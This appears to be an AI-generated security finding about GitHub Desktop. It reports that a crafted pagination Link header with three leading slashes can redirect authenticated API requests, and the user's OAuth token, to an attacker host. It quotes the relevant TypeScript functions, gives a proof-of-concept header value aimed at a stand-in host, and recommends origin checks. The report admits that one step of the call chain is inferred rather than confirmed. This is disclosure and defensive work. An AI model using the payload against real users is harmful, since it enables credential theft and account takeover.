## Analysis

The sei-cosmos report is about **untrusted pagination inputs driving unbounded/unsafe iteration**. In GitHub Desktop, the analogous “paginated RPC” surface is `API.fetchAll` in `app/src/lib/api.ts`, which follows the GitHub `Link: rel="next"` header returned by the server to keep paging through issues, PRs, repos, orgs, etc. That header is **attacker-influenced data**, because it originates from whatever GitHub Enterprise Server / proxy the user has configured as their API endpoint. Instead of a DoS via unbounded scanning, the equivalent Desktop bug is a **host-confusion / URL-authority injection** in the code that turns the server-supplied "next" path back into a request URL — and that request always carries the user's `Authorization: Bearer <token>` header.

### Title
Malicious pagination `Link` header can redirect authenticated API requests (with OAuth token) to an attacker-controlled host - (File: `app/src/lib/http.ts`)

### Summary
`API.fetchAll` (`app/src/lib/api.ts:1778-1804`) blindly follows the `next` URL parsed out of the server's `Link` response header via `getNextPagePathFromLink` (`app/src/lib/api.ts:692-710`) and feeds it straight back into `ghRequest`, which ultimately calls `request()` → `getAbsoluteUrl()` in `app/src/lib/http.ts:86-101, 116-153`. `getAbsoluteUrl` strips only a single leading `/` before handing the value to `new URL(relativePath, base)`. A crafted `Link` value containing three leading slashes (`///host/path`) survives Node's legacy `url.parse()` as a literal path, has exactly one slash stripped by `getAbsoluteUrl`, and is left with two leading slashes — which the WHATWG `URL` constructor interprets as a network-path reference, replacing the authority (host) of the configured endpoint with the attacker's host while keeping the scheme. The subsequent `fetch()` call still attaches the user's `Authorization: Bearer <token>` header (`app/src/lib/http.ts:133-135`), so the token is sent to the attacker's server.

### Finding Description
- `getNextPagePathFromLink` extracts the URL from the `Link` header with a permissive regex `<([^>]+)>; rel="([^"]+)"` and passes it to Node's legacy `URL.parse()`, taking only `.path` — this is done specifically so an absolute URL's host isn't kept. [1](#0-0) 
- However, `.path` from legacy `url.parse()` preserves any leading slashes exactly as written when no scheme is present (slashesDenoteHost defaults to `false`), so a value like `///evil.example/steal` yields `path = "///evil.example/steal"`. This value is used as `nextPath` in the `fetchAll` loop. [2](#0-1) 
- `getAbsoluteUrl` only strips a *single* leading slash before resolving against the configured endpoint: `path[0] === '/' ? path.substring(1) : path`. For `///evil.example/steal` this produces `//evil.example/steal` — a network-path reference. `new URL('//evil.example/steal', 'https://ghe.internal/api/v3/')` resolves to `https://evil.example/steal`, discarding the configured host entirely. [3](#0-2) 
- `request()` always attaches the OAuth/PAT `Authorization` header to whatever URL `getAbsoluteUrl` returns, with no host allow-list check before calling `fetch(url, options)`. [4](#0-3) 
- This path is reachable from any paginated call that uses the default `getNextPagePathFromLink` (not the custom `getNextPagePathWithIncreasingPageSize`), e.g. `fetchIssues`, `fetchAllOpenPullRequests`, `streamUserRepositories`, `fetchOrgs`. [5](#0-4) [6](#0-5) [7](#0-6) 

**Corrupted value:** the resolved request URL's authority/host, which should always remain the user's configured `endpoint` (e.g. `api.github.com` or their GHE server) but instead becomes an attacker-chosen host embedded in a single response header.

**Why existing guards don't stop it:** `getAbsoluteUrl`'s comment states its intent is to prevent duplicating the `/api/v3/` fragment, not to prevent protocol-relative host injection; its slash-stripping logic (`substring(1)`) assumes at most one leading slash can appear, which is false for `.path` values produced from `///`-prefixed inputs.

### Impact Explanation
Any account/session token held by Desktop (`Authorization: Bearer <token>`) is exfiltrated to a third-party host whenever the app pages through issues/PRs/repos/orgs against a GitHub Enterprise Server (or any endpoint) an attacker can influence responses for (e.g., a malicious/compromised GHE instance, or a MITM/compromised reverse proxy sitting in front of it). Token theft enables full account/API takeover — repo read/write, code execution via workflow dispatch, etc. This clearly falls under "credential/token exfiltration" in the valid-impact list.

### Likelihood Explanation
The attacker needs only to control one HTTP response header (`Link`) from a GitHub Enterprise endpoint the victim has added, or intercept/tamper with such a response — no local access, malware, or leaked credentials required, and no unnatural user interaction is needed beyond normal use of Desktop against that server (viewing issues/PRs, refreshing repo list). This matches the "attacker controls ... a git remote/proxy response" criterion in the prompt's valid-impact scope.

### Recommendation
- In `getAbsoluteUrl` (`app/src/lib/http.ts`), strip **all** leading slashes from `path` before treating it as a relative reference (or reject/normalize any path beginning with `//` after stripping), so it can never be resolved as a network-path reference.
- Alternatively, resolve the final URL and explicitly assert `resolvedUrl.origin === new URL(endpoint).origin` before issuing the authenticated `fetch`, throwing/aborting otherwise.
- Add a regression test feeding `Link: <///evil.example/steal>; rel="next"` (and other slash-count variants) through `getNextPagePathFromLink` → `getAbsoluteUrl` to assert the resolved host never changes.

### Proof of Concept
1. Point Desktop at a GitHub Enterprise Server endpoint controlled or MITM'd by the attacker.
2. Trigger any paginated fetch, e.g. `API.fetchIssues` on a repo with more than one page of issues.
3. On the first page response, the server includes:
   `Link: <///evil.example/steal>; rel="next"`
4. `getNextPagePathFromLink` returns `path = "///evil.example/steal"`. [1](#0-0) 
5. `fetchAll` calls `this.ghRequest('GET', "///evil.example/steal")`, which eventually calls `request(endpoint, token, 'GET', "///evil.example/steal", ...)`. [8](#0-7) 
6. `getAbsoluteUrl` strips one slash → `"//evil.example/steal"`, then `new URL("//evil.example/steal", "https://ghe.internal/api/v3/")` resolves to `"https://evil.example/steal"`. [3](#0-2) 
7. `fetch()` sends a GET request to `https://evil.example/steal` with header `Authorization: Bearer <user's token>`, which the attacker's server logs. [9](#0-8) 

**Note on confirmation gap:** I could not directly view the body of `API.prototype.ghRequest` in this pass (only its call sites), so the exact wiring from `ghRequest` to `request()`/`getAbsoluteUrl()` is inferred from the consistent use of `request`, `parsedResponse`, and `getAbsoluteUrl` as the file's only HTTP helpers. If you need certainty on `ghRequest`'s internals, a full read of `app/src/lib/api.ts` (or a Devin session with full file access) would confirm it directly.

```typescript
function getNextPagePathFromLink(response: Response): string | null {
  const linkHeader = response.headers.get('Link')

  if (!linkHeader) {
    return null
  }

  for (const part of linkHeader.split(',')) {
    // https://github.com/philschatz/octokat.js/blob/5658abe442e8bf405cfda1c72629526a37554613/src/plugins/pagination.js#L17
    const match = part.match(/<([^>]+)>; rel="([^"]+)"/)

    if (match && match[2] === 'next') {
      const nextURL = URL.parse(match[1])
      return nextURL.path || null
    }
  }

  return null
}
```

```typescript
  private async fetchAll<T>(path: string, options?: IFetchAllOptions<T>) {
    const buf = new Array<T>()
    const opts: IFetchAllOptions<T> = { perPage: 100, ...options }
    const params = { per_page: `${opts.perPage}` }

    let nextPath: string | null = urlWithQueryString(path, params)
    let page: ReadonlyArray<T> = []
    do {
      const response: Response = await this.ghRequest('GET', nextPath)
      if (opts.suppressErrors !== false && !response.ok) {
        log.warn(`fetchAll: '${path}' returned a ${response.status}`)
        return buf
      }

      page = await parsedResponse<ReadonlyArray<T>>(response)
      if (page) {
        buf.push(...page)
        opts.onPage?.(page)
      }

      nextPath = opts.getNextPagePath
        ? opts.getNextPagePath(response)
        : getNextPagePathFromLink(response)
    } while (nextPath && (!opts.continue || (await opts.continue(buf))))

    return buf
  }
```

```typescript
export function getAbsoluteUrl(endpoint: string, path: string): string {
  let relativePath = path[0] === '/' ? path.substring(1) : path
  if (relativePath.startsWith('api/v3/')) {
    relativePath = relativePath.substring(7)
  }

  // Our API endpoints are a bit sloppy in that they don't typically
  // include the trailing slash (i.e. we use https://api.github.com for
  // dotcom and https://ghe.enterprise.local/api/v3 for Enterprise when
  // both of those should really include the trailing slash since that's
  // the qualified base). We'll work around our past since here by ensuring
  // that the endpoint ends with a trailing slash.
  const base = endpoint.endsWith('/') ? endpoint : `${endpoint}/`

  return new URL(relativePath, base).toString()
}
```

```typescript
export function request(
  endpoint: string,
  token: string | null,
  method: HTTPMethod,
  path: string,
  jsonBody?: Object,
  customHeaders?: Object,
  reloadCache: boolean = false
): Promise<Response> {
  const url = getAbsoluteUrl(endpoint, path)

  let headers: any = {
    Accept: 'application/vnd.github.v3+json, application/json',
    'Content-Type': 'application/json',
    'User-Agent': getUserAgent(),
  }

  if (token) {
    headers['Authorization'] = `Bearer ${token}`
  }

  headers = {
    ...headers,
    ...customHeaders,
  }

  const options: RequestInit = {
    headers,
    method,
    body: JSON.stringify(jsonBody),
  }

  if (reloadCache) {
    options.cache = 'reload' as RequestCache
  }

  return fetch(url, options)
}
```
